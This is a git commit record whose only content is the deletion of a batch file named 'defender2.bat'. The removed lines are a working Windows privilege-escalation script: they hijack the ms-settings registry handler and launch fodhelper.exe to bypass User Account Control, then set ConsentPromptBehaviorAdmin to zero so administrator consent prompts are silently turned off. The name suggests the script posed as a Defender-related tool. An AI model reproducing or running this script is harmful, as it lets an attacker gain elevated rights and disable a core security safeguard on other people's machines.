28a1bcc7efc4a2a51790c26dd4589d0449b301b8
festorex <94487372+festorex@users.noreply.github.com>
2021-11-24 14:50:56 +0100

    Delete defender2.bat

--- defender2.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" /f
-REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f
-fodhelper.exe
